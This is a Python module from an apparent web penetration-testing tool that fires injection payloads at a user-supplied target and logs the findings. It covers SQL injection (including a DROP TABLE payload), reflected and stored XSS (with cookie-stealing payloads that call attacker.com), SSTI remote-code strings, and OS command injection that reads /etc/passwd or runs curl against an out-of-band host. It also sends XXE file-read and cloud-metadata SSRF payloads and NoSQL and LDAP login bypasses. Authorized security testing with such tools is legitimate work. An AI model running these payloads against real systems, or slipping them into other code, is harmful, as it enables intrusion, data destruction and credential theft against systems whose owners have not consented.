"""
modules/injection.py
tmrswrr - A03: Injection
SQLi, XSS, SSTI, Command Injection, XXE, LDAP Injection, NoSQL Injection
"""
import os
import shutil
from pathlib import Path

import requests

from config.settings import OUTPUT_DIR, SESSION, add_vuln, save_session
from utils.helpers import (
    DIM,
    NEON_CYN,
    NEON_GRN,
    NEON_RED,
    PURE_WHITE,
    RST,
    error,
    info,
    print_banner,
    prompt,
    run_and_print,
    section,
    success,
    warn,
)
from utils.http import ScopeViolation, get_client
from utils.oob import get_collaborator
from utils.tools import remote_payload, tool_cmd


def _out(name: str) -> str:
    d = str(OUTPUT_DIR)
    os.makedirs(d, exist_ok=True)
    return os.path.join(d, name)


def _baseline_latency(client, url: str, samples: int = 3) -> float | None:
    """Median round-trip time for the untouched URL.

    Time-based blind detection compares against this instead of a hard-coded
    threshold - on a slow or rate-limited target a fixed 4.5s cutoff reports
    every payload as a hit.
    """
    import time
    timings = []
    for _ in range(samples):
        start = time.time()
        if client.safe_get(url, timeout=15) is None:
            continue
        timings.append(time.time() - start)
    if not timings:
        return None
    timings.sort()
    return timings[len(timings) // 2]


def _post(client, url: str, body, headers: dict):
    """POST that returns None instead of raising, for payload loops."""
    try:
        return client.post(url, data=body, headers=headers)
    except (requests.RequestException, ScopeViolation) as exc:
        warn(f"request failed: {exc}")
        return None


def _login_baseline(client, url: str) -> tuple[int, int] | None:
    """(status, body length) of a login attempt that certainly fails.

    Auth-bypass detection used to look for "welcome", "token" or "dashboard" in
    the response - words that a login *page* contains while rejecting you. The
    only usable reference is what this endpoint does with credentials known to
    be wrong.
    """
    import uuid
    junk = uuid.uuid4().hex[:12]
    resp = _post(client, url, f"username=yeepforge_{junk}&password={junk}",
                 {"Content-Type": "application/x-www-form-urlencoded"})
    if resp is None:
        return None
    info(f"Failed-login baseline: HTTP {resp.status_code}, {len(resp.text)} bytes")
    return resp.status_code, len(resp.text)


def _differs_from_failed_login(response, baseline: tuple[int, int]) -> bool:
    """True when a response is materially unlike a known-bad login attempt."""
    status, length = baseline
    if response.status_code != status:
        return True
    # Same status: a redirect target or a session cookie is the giveaway, and
    # otherwise a body that is not the same size as the rejection page.
    if any(c.lower().startswith(("session", "auth", "token", "jwt"))
           for c in response.cookies.keys()):
        return True
    return abs(len(response.text) - length) > max(64, length * 0.10)


#: sqlmap writes this line into <output-dir>/<host>/log once it has proven a
#: parameter injectable. Its absence is the only reliable "nothing found".
SQLMAP_PROOF = "sqlmap identified the following injection point"


def _record_sqlmap_result(output_dir: str, target: str) -> None:
    """Turn sqlmap's own verdict into a finding - or into nothing at all.

    Reading the log rather than assuming success matters: the previous version
    recorded a Critical SQL Injection the moment sqlmap was invoked, so every
    scan of every target produced one, and a real hit was indistinguishable
    from a clean run.
    """
    proof = ""
    for root, _dirs, files in os.walk(output_dir):
        for name in files:
            if name != "log":
                continue
            try:
                text = Path(root, name).read_text(encoding="utf-8", errors="replace")
            except OSError:
                continue
            if SQLMAP_PROOF in text:
                proof = text[text.index(SQLMAP_PROOF):][:1500]
                break
        if proof:
            break

    if not proof:
        info("sqlmap did not prove an injection point - nothing recorded.")
        return

    success("sqlmap confirmed an injection point.")
    add_vuln("SQL Injection", "Critical", "A03:2021",
             f"sqlmap proved an injectable parameter.\n\n{proof}",
             target, confidence="Confirmed", cwe="CWE-89",
             remediation="Use parameterised queries; the injected parameter is "
                         "concatenated into SQL.")


def _target() -> str:
    url = SESSION.get("target_url", "")
    if not url:
        url = prompt("Target URL")
        SESSION["target_url"] = url
    return url


def sql_injection():
    section("SQL INJECTION")
    url = _target()
    print(f"""
  {NEON_CYN}[1]{RST} sqlmap (automated, full scan)
  {NEON_CYN}[2]{RST} sqlmap (POST request)
  {NEON_CYN}[3]{RST} sqlmap (from request file)
  {NEON_CYN}[4]{RST} Manual SQLi payload tester
  {NEON_CYN}[5]{RST} Blind SQLi time-based check
  {NEON_GRN}[0]{RST} Back
""")
    c = prompt("Choice")
    cookies = SESSION.get("cookies", "")
    # Cookies go through the arg list rather than into the command string, so a
    # session value containing quotes or $(...) reaches sqlmap intact.
    cookie_argv = ["--cookie=" + cookies] if cookies else []
    common = ["--batch", "--level=3", "--risk=2", "--dbs"]

    if c == "1":
        if not shutil.which("sqlmap"):
            warn("sqlmap not found. Install: apt install sqlmap")
            return
        target_url = prompt("Full URL with parameter (e.g. http://site.com/page?id=1)")
        out = _out("sqlmap_get")
        run_and_print(
            tool_cmd("sqlmap", ["-u", target_url, *cookie_argv, *common,
                                f"--output-dir={out}"]),
            timeout=600
        )
        # sqlmap having run is not a finding; its verdict is in the output above
        # and in the report it writes. Recording a Critical here regardless of
        # the result is how a scan produces a false SQLi on every target.
        _record_sqlmap_result(out, target_url)

    elif c == "2":
        if not shutil.which("sqlmap"):
            warn("sqlmap not found. Install: apt install sqlmap")
            return
        target_url = prompt("Target URL")
        data = prompt("POST data (e.g. username=admin&password=*)")
        out = _out("sqlmap_post")
        run_and_print(
            tool_cmd("sqlmap", ["-u", target_url, f"--data={data}", *cookie_argv,
                                *common, f"--output-dir={out}"]),
            timeout=600
        )
        _record_sqlmap_result(out, target_url)

    elif c == "3":
        req_file = prompt("Path to request file (proxy/Burp format)")
        if os.path.exists(req_file):
            out = _out("sqlmap_file")
            run_and_print(
                tool_cmd("sqlmap", ["-r", req_file, *common, f"--output-dir={out}"]),
                timeout=600
            )
            _record_sqlmap_result(out, req_file)
        else:
            error("File not found")

    elif c == "4":
        target_url = prompt("URL with parameter (e.g. http://site.com/page?id=1)")
        payloads = [
            "1'",
            "1\"",
            "1' OR '1'='1",
            "1' OR 1=1--",
            "1' AND 1=2--",
            "1 UNION SELECT NULL--",
            "1 UNION SELECT NULL,NULL--",
            "1' WAITFOR DELAY '0:0:5'--",
            "1'; DROP TABLE users--",
            "admin'--",
            "' OR 'x'='x",
        ]
        info(f"Testing {len(payloads)} payloads against: {target_url}")
        print()
        client = get_client()
        for p in payloads:
            import urllib.parse
            enc = urllib.parse.quote(p)
            test_url = target_url.replace("=1", f"={enc}").replace("=admin", f"={enc}")
            resp = client.safe_get(test_url)
            if resp is None:
                print(f"  {DIM}[!] {p} (request failed){RST}")
                continue
            indicators = ["sql syntax", "mysql", "syntax error", "ora-", "pg_", "sqlite", "postgresql"]
            hit = next((i for i in indicators if i in resp.text.lower()), None)
            if hit:
                success(f"POSSIBLE SQLi with payload: {p}")
                add_vuln("SQL Injection", "Critical", "A03:2021",
                         f"Error-based SQLi: payload {p} produced a database error ('{hit}')",
                         test_url, evidence=resp.evidence, confidence="Confirmed", cwe="CWE-89")
            else:
                print(f"  {DIM}[-] {p}{RST}")

    elif c == "5":
        target_url = prompt("URL with parameter")
        import time
        info("Testing time-based blind SQLi (5s delay payloads)...")
        time_payloads = [
            "1' WAITFOR DELAY '0:0:5'--",
            "1'; SELECT SLEEP(5)--",
            "1 AND SLEEP(5)--",
            "1' AND SLEEP(5)--",
            "1); SELECT pg_sleep(5)--",
        ]
        client = get_client()
        baseline = _baseline_latency(client, target_url)
        if baseline is not None:
            info(f"Baseline response time: {baseline:.2f}s")
        for p in time_payloads:
            import urllib.parse
            enc = urllib.parse.quote(p)
            test_url = target_url.replace("=1", f"={enc}")
            start = time.time()
            resp = client.safe_get(test_url, timeout=15)
            elapsed = time.time() - start
            if resp is None:
                print(f"  {DIM}[!] {p} (request failed){RST}")
                continue
            # Compare against the target's own baseline, not a fixed 4.5s: a
            # slow app would otherwise report every payload as a blind SQLi.
            threshold = 4.5 if baseline is None else max(4.5, baseline + 3.5)
            if elapsed >= threshold:
                success(f"TIME-BASED BLIND SQLi CONFIRMED! Delay={elapsed:.1f}s  Payload: {p}")
                detail = f"Response took {elapsed:.1f}s with payload {p}"
                if baseline is not None:
                    detail += f" (baseline {baseline:.2f}s)"
                add_vuln("Blind SQL Injection (Time-Based)", "Critical", "A03:2021",
                         detail, test_url, evidence=resp.evidence,
                         confidence="Firm", cwe="CWE-89")
                break
            else:
                print(f"  {DIM}[-] {p} (elapsed: {elapsed:.1f}s){RST}")


def xss_test():
    section("CROSS-SITE SCRIPTING (XSS)")
    url = _target()
    print(f"""
  {NEON_CYN}[1]{RST} Reflected XSS - parameter fuzzing
  {NEON_CYN}[2]{RST} DOM XSS - browser-based detection
  {NEON_CYN}[3]{RST} XSSstrike (advanced XSS scanner)
  {NEON_CYN}[4]{RST} dalfox (fast XSS scanner)
  {NEON_CYN}[5]{RST} Stored XSS payload injection
  {NEON_GRN}[0]{RST} Back
""")
    c = prompt("Choice")

    payloads = [
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "';alert(1)//",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "<body onload=alert(1)>",
        "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        "{{7*7}}",
        "${7*7}",
    ]

    if c == "1":
        target_url = prompt("URL with parameter (e.g. http://site.com/search?q=test)")
        info(f"Testing {len(payloads)} XSS payloads...")
        client = get_client()
        for p in payloads:
            import urllib.parse
            enc = urllib.parse.quote(p)
            test_url = target_url.split("=")[0] + "=" + enc
            resp = client.safe_get(test_url)
            if resp is None:
                print(f"  {DIM}[!] {p[:50]} (request failed){RST}")
                continue
            body = resp.text
            if p.lower().replace(" ", "") in body.lower().replace(" ", "") or \
               urllib.parse.unquote(enc).lower() in body.lower():
                # Reflected in an HTML response is what makes it exploitable;
                # a JSON/text echo is worth reporting but not the same finding.
                ctype = resp.headers.get("Content-Type", "")
                is_html = "html" in ctype.lower()
                success(f"REFLECTED XSS: payload echoed unencoded: {p}")
                add_vuln("Reflected XSS", "High" if is_html else "Medium", "A03:2021",
                         f"Payload reflected unencoded in a {ctype or 'unknown'} response: {p}",
                         test_url, evidence=resp.evidence,
                         confidence="Firm" if is_html else "Tentative", cwe="CWE-79")
            else:
                print(f"  {DIM}[-] {p[:50]}{RST}")

    elif c == "3":
        if shutil.which("xsstrike"):
            target_url = prompt("Target URL with parameter")
            run_and_print(tool_cmd("xsstrike", ["-u", target_url]), timeout=300)
        else:
            warn("XSStrike not found. Install: pip install xsstrike")
            print("  Or: git clone https://github.com/s0md3v/XSStrike && pip install -r XSStrike/requirements.txt")

    elif c == "4":
        if shutil.which("dalfox"):
            target_url = prompt("Target URL with parameter")
            out = _out("dalfox.txt")
            # --skip-bav and --skip-mining-dict drop the side scans that dominate
            # dalfox's runtime without testing the parameter we came for.
            run_and_print(
                tool_cmd("dalfox", ["url", target_url, "-o", out,
                                    "--timeout", "10", "--skip-bav",
                                    "--skip-mining-dict"]),
                timeout=300
            )
        else:
            warn("dalfox not found. Install: go install github.com/hahwul/dalfox/v2@latest")

    elif c == "5":
        print(f"\n  {NEON_CYN}Stored XSS payloads to inject in form fields:{RST}")
        stored_payloads = [
            '<script>document.location="http://attacker.com/?c="+document.cookie</script>',
            '<img src=x onerror="fetch(\'http://attacker.com/\'+btoa(document.cookie))">',
            '<svg/onload=fetch(`http://attacker.com/?`+document.cookie)>',
        ]
        for p in stored_payloads:
            print(f"  {NEON_GRN}{p}{RST}")

    elif c == "2":
        print(f"""
  {NEON_CYN}DOM XSS sources to test:{RST}
    location.hash, location.search, document.referrer, window.name

  {NEON_CYN}DOM XSS sinks to check:{RST}
    innerHTML, document.write(), eval(), setTimeout(), location.href

  {NEON_CYN}Browser test payloads:{RST}
    https://{url.split("//")[-1]}#<img src=x onerror=alert(1)>
    https://{url.split("//")[-1]}?debug=<script>alert(1)</script>
""")


def ssti_test():
    section("SERVER-SIDE TEMPLATE INJECTION (SSTI)")
    url = _target()

    payloads = {
        "{{7*7}}":           "49",       # Jinja2, Twig
        "${7*7}":            "49",       # Freemarker, Thymeleaf
        "#{7*7}":            "49",       # Ruby ERB
        "{{7*'7'}}":         "7777777",  # Jinja2
        "<%= 7*7 %>":        "49",       # ERB
        "${{7*7}}":          "49",       # Pebble
        "{7*7}":             "49",       # Smarty
        "*{7*7}":            "49",       # Spring SpEL
    }

    target_url = prompt("URL with template parameter (e.g. http://site.com/render?name=test)")
    param = target_url.split("=")[-1] if "=" in target_url else "test"
    base_url = target_url.rsplit("=", 1)[0] + "="

    info(f"Testing {len(payloads)} SSTI probes...")
    print()

    client = get_client()
    for payload, expected in payloads.items():
        import urllib.parse
        enc = urllib.parse.quote(payload)
        test_url = f"{base_url}{enc}"
        resp = client.safe_get(test_url)
        if resp is None:
            print(f"  {DIM}[!] {payload} (request failed){RST}")
            continue
        out = resp.text
        # The literal payload echoed back is not evaluation - only count it as
        # SSTI when the *result* appears without the payload itself.
        if expected in out and payload not in out:
            success(f"SSTI CONFIRMED! Payload: {payload}  Engine response: {expected}")
            add_vuln("Server-Side Template Injection", "Critical", "A03:2021",
                     f"Template engine evaluated {payload} and returned {expected}",
                     test_url, evidence=resp.evidence, confidence="Confirmed", cwe="CWE-1336")
            print(f"\n  {NEON_RED}SSTI RCE Payloads:{RST}")
            print("  Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}")
            print("  Twig RCE:   {{['id']|filter('system')}}")
        else:
            print(f"  {DIM}[-] {payload}{RST}")


def command_injection():
    section("COMMAND INJECTION")
    url = _target()

    payloads = [
        "; id",
        "| id",
        "|| id",
        "&& id",
        "`id`",
        "$(id)",
        "; whoami",
        "| cat /etc/passwd",
        "; sleep 5",
        "| sleep 5",
        "$(sleep 5)",
        "\n id",
        "%0a id",
        "%0d%0a id",
    ]

    target_url = prompt("URL with parameter (e.g. http://site.com/ping?host=127.0.0.1)")
    base_url = target_url.rsplit("=", 1)[0] + "="

    info(f"Testing {len(payloads)} command injection payloads...")
    print()

    import time
    client = get_client()
    baseline = _baseline_latency(client, target_url)
    if baseline is not None:
        info(f"Baseline response time: {baseline:.2f}s")

    for p in payloads:
        import urllib.parse
        enc = urllib.parse.quote(p)
        test_url = f"{base_url}127.0.0.1{enc}"
        start = time.time()
        resp = client.safe_get(test_url, timeout=15)
        elapsed = time.time() - start
        if resp is None:
            print(f"  {DIM}[!] {p} (request failed){RST}")
            continue
        out = resp.text

        indicators = ["uid=", "root:", "daemon:", "bin/sh", "www-data"]
        hit = next((i for i in indicators if i in out), None)
        threshold = 4.5 if baseline is None else max(4.5, baseline + 3.5)
        if hit:
            success(f"COMMAND INJECTION CONFIRMED! Payload: {p}")
            print(f"  Output: {out[:200]}")
            add_vuln("Command Injection", "Critical", "A03:2021",
                     f"Command output visible in the response ('{hit}') with payload: {p}",
                     test_url, evidence=resp.evidence, confidence="Confirmed", cwe="CWE-78")
        elif ("sleep" in p or "wait" in p) and elapsed >= threshold:
            success(f"BLIND COMMAND INJECTION (time-based)! Payload: {p}  Delay: {elapsed:.1f}s")
            detail = f"Response took {elapsed:.1f}s with payload {p}"
            if baseline is not None:
                detail += f" (baseline {baseline:.2f}s)"
            add_vuln("Blind Command Injection", "Critical", "A03:2021",
                     detail, test_url, evidence=resp.evidence,
                     confidence="Firm", cwe="CWE-78")
        else:
            print(f"  {DIM}[-] {p}{RST}")

    # Time-based detection is the least reliable signal there is: a loaded
    # target crosses the threshold on its own, and a sandboxed one without
    # /bin/sleep never will. An out-of-band callback settles it.
    oob = get_collaborator()
    if oob is None:
        warn("No OOB collaborator - blind command injection was only tested by timing.")
        return

    info(f"Confirming out-of-band via {oob.describe()}")
    import urllib.parse
    # remote_payload() marks these as commands for the target's shell, not ours.
    oob_variants = [
        ("curl-semi",  lambda h: remote_payload(f"; curl http://{h}/")),
        ("curl-pipe",  lambda h: remote_payload(f"| curl http://{h}/")),
        ("subshell",   lambda h: remote_payload(f"$(curl http://{h}/)")),
        ("backtick",   lambda h: remote_payload(f"`curl http://{h}/`")),
        ("nslookup",   lambda h: remote_payload(f"& nslookup {h}")),
        ("powershell", lambda h: remote_payload(f"; powershell -c \"iwr http://{h}/\"")),
    ]
    sent = []
    for tag, build in oob_variants:
        payload = build(oob.hostname(f"cmdi-{tag}"))
        test_url = f"{base_url}127.0.0.1{urllib.parse.quote(payload)}"
        resp = client.safe_get(test_url, timeout=15)
        print(f"  {DIM}[→] {tag}: {payload}{RST}")
        if resp is not None:
            sent.append((tag, payload, test_url, resp))

    confirmed = False
    for tag, payload, test_url, resp in sent:
        hits = oob.wait_for(f"cmdi-{tag}", timeout=20 if not confirmed else 5)
        if not hits:
            continue
        confirmed = True
        protocols = sorted({h.get("protocol", "?") for h in hits})
        origin = hits[0].get("remote-address", "unknown")
        success(f"BLIND COMMAND INJECTION CONFIRMED via {tag} ({origin})")
        add_vuln("Blind Command Injection (out-of-band confirmed)", "Critical",
                 "A03:2021",
                 f"Payload `{payload}` caused the target to make a "
                 f"{'/'.join(protocols)} request to the collaborator from {origin}. "
                 "The injected command executed on the server.",
                 test_url, evidence=resp.evidence,
                 confidence="Confirmed", cwe="CWE-78")
    if not confirmed:
        info("No OOB callback - no evidence of command execution on this parameter.")


def xxe_test():
    section("XML EXTERNAL ENTITY (XXE)")
    url = _target()

    print(f"""
  {NEON_CYN}XXE Payloads:{RST}

  {NEON_GRN}[1] Classic XXE (read /etc/passwd):{RST}
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><data>&xxe;</data></root>

  {NEON_GRN}[2] Blind XXE (OOB via DNS):{RST}
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://COLLAB.burpcollaborator.net/x"> %xxe; ]>
<foo></foo>

  {NEON_GRN}[3] XXE via SVG upload:{RST}
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="128px" height="128px"><text>&xxe;</text></svg>

  {NEON_GRN}[4] SSRF via XXE:{RST}
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<root>&xxe;</root>
""")

    c = prompt("Send XXE payload? [1] Yes  [2] No")
    if c == "1":
        endpoint = prompt("XML endpoint (e.g. /api/parse)")
        oob = get_collaborator(required=True)
        if oob is None:
            warn("No collaborator available - blind XXE cannot be confirmed.")
            return
        collab = oob.hostname("xxe")

        xxe_payload = (
            '<?xml version="1.0"?><!DOCTYPE foo '
            f'[ <!ENTITY % xxe SYSTEM "http://{collab}/xxe"> %xxe; ]><foo></foo>'
        )
        client = get_client()
        try:
            resp = client.post(url.rstrip("/") + "/" + endpoint.lstrip("/"),
                               data=xxe_payload,
                               headers={"Content-Type": "application/xml"})
        except (requests.RequestException, ScopeViolation) as exc:
            error(f"XXE request failed: {exc}")
            return

        print(f"  HTTP {resp.status_code}\n  {resp.text[:400]}")
        # An in-band echo of the entity proves it without waiting for a callback.
        if "root:x:" in resp.text or "/bin/" in resp.text:
            success("XXE CONFIRMED - file contents returned in the response.")
            add_vuln("XXE - File Disclosure", "Critical", "A05:2021",
                     "The XML parser resolved an external entity and returned its "
                     "contents in the response.",
                     url + endpoint, evidence=resp.evidence,
                     confidence="Confirmed", cwe="CWE-611")
        else:
            info(f"No in-band echo. Check {collab} for a callback - a hit there "
                 "confirms blind XXE.")
            add_vuln("XXE - Blind (callback pending)", "High", "A05:2021",
                     f"External-entity payload accepted (HTTP {resp.status_code}); "
                     f"confirmation depends on a callback to {collab}.",
                     url + endpoint, evidence=resp.evidence,
                     confidence="Tentative", cwe="CWE-611")


def nosql_injection():
    section("NoSQL INJECTION")
    url = _target()

    info("Testing MongoDB/NoSQL injection patterns...")

    payloads_json = [
        '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
        '{"username": "admin", "password": {"$regex": ".*"}}',
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"$where": "this.username == \'admin\'"}',
    ]

    payloads_url = [
        "username[$gt]=&password[$gt]=",
        "username[$ne]=invalid&password[$ne]=invalid",
        "username=admin&password[$regex]=.*",
    ]

    target_url = prompt("Login endpoint (e.g. /api/login)")
    endpoint = url.rstrip("/") + "/" + target_url.lstrip("/")
    client = get_client()

    # A login page that says "Welcome, please log in" matches every success
    # keyword on a *failed* attempt. Compare against a known-bad login instead.
    baseline = _login_baseline(client, endpoint)
    if baseline is None:
        error("Could not establish a failed-login baseline - aborting.")
        return

    print(f"\n  {NEON_CYN}Testing URL-encoded NoSQL payloads:{RST}")
    form = {"Content-Type": "application/x-www-form-urlencoded"}
    for p in payloads_url:
        resp = _post(client, endpoint, p, form)
        if resp is None:
            print(f"  {DIM}[!] {p} (request failed){RST}")
        elif _differs_from_failed_login(resp, baseline):
            success(f"NoSQL INJECTION: response differs from a failed login! Payload: {p}")
            add_vuln("NoSQL Injection", "Critical", "A03:2021",
                     f"Operator-injection payload `{p}` produced a response unlike a "
                     f"known-bad login (HTTP {resp.status_code} vs {baseline[0]}, "
                     f"{len(resp.text)} vs {baseline[1]} bytes).",
                     endpoint, evidence=resp.evidence,
                     confidence="Firm", cwe="CWE-943")
        else:
            print(f"  {DIM}[-] {p}{RST}")

    print(f"\n  {NEON_CYN}Testing JSON NoSQL payloads:{RST}")
    json_headers = {"Content-Type": "application/json"}
    for p in payloads_json:
        resp = _post(client, endpoint, p, json_headers)
        if resp is None:
            print(f"  {DIM}[!] {p[:50]} (request failed){RST}")
        elif _differs_from_failed_login(resp, baseline):
            success(f"NoSQL INJECTION (JSON body)! Payload: {p}")
            add_vuln("NoSQL Injection", "Critical", "A03:2021",
                     f"JSON operator-injection payload `{p}` produced a response unlike "
                     f"a known-bad login (HTTP {resp.status_code}, {len(resp.text)} bytes).",
                     endpoint, evidence=resp.evidence,
                     confidence="Firm", cwe="CWE-943")
        else:
            print(f"  {DIM}[-] {p[:50]}{RST}")


def ldap_injection():
    section("LDAP INJECTION")
    print(f"""
  {NEON_CYN}LDAP Injection Payloads:{RST}

  Authentication bypass:
    Username: admin)(&)
    Username: *)(&
    Username: *)(|(password=*)
    Username: admin)(!(&(1=0))
    Password: anything

  {NEON_CYN}Test in login form with these usernames:{RST}
    *
    *)(&
    admin)(&
    *)(uid=*))(|(uid=*
    \\2a)(uid=*))(|(uid=\\2a

  {NEON_CYN}Time-based LDAP injection:{RST}
    admin)(|(password=heuristic)(|(password=b
""")
    url = _target()
    endpoint = prompt("Login endpoint path")

    payloads = [
        ("*", "anything"),
        ("admin)(&)", "anything"),
        ("*)(&", "anything"),
    ]

    login_url = url.rstrip("/") + "/" + endpoint.lstrip("/")
    client = get_client()
    baseline = _login_baseline(client, login_url)
    if baseline is None:
        error("Could not establish a failed-login baseline - aborting.")
        return

    form = {"Content-Type": "application/x-www-form-urlencoded"}
    for user, pwd in payloads:
        import urllib.parse
        data = f"username={urllib.parse.quote(user)}&password={urllib.parse.quote(pwd)}"
        resp = _post(client, login_url, data, form)
        if resp is None:
            print(f"  {DIM}[!] username={user} (request failed){RST}")
        elif _differs_from_failed_login(resp, baseline):
            success(f"LDAP INJECTION: response differs from a failed login! user={user}")
            add_vuln("LDAP Injection", "Critical", "A03:2021",
                     f"Filter-injection username `{user}` produced a response unlike a "
                     f"known-bad login (HTTP {resp.status_code} vs {baseline[0]}, "
                     f"{len(resp.text)} vs {baseline[1]} bytes).",
                     login_url, evidence=resp.evidence,
                     confidence="Firm", cwe="CWE-90")
        else:
            print(f"  {DIM}[-] username={user}{RST}")


def run():
    print_banner("INJECTION", "A03:2021 - OWASP Top 10 #3")
    while True:
        url = SESSION.get("target_url", "-")
        print(f"""
  {NEON_GRN}Target:{RST} {PURE_WHITE}{url}{RST}

  {NEON_CYN}[1]{RST} SQL Injection (sqlmap + manual)
  {NEON_CYN}[2]{RST} Cross-Site Scripting (XSS)
  {NEON_CYN}[3]{RST} Server-Side Template Injection (SSTI)
  {NEON_CYN}[4]{RST} Command Injection (OS Command)
  {NEON_CYN}[5]{RST} XML External Entity (XXE)
  {NEON_CYN}[6]{RST} NoSQL Injection (MongoDB)
  {NEON_CYN}[7]{RST} LDAP Injection
  {NEON_GRN}[0]{RST} Back to main menu
""")
        c = prompt("Choice")
        if c == "0":
            break
        elif c == "1":
            sql_injection()
        elif c == "2":
            xss_test()
        elif c == "3":
            ssti_test()
        elif c == "4":
            command_injection()
        elif c == "5":
            xxe_test()
        elif c == "6":
            nosql_injection()
        elif c == "7":
            ldap_injection()
        save_session()
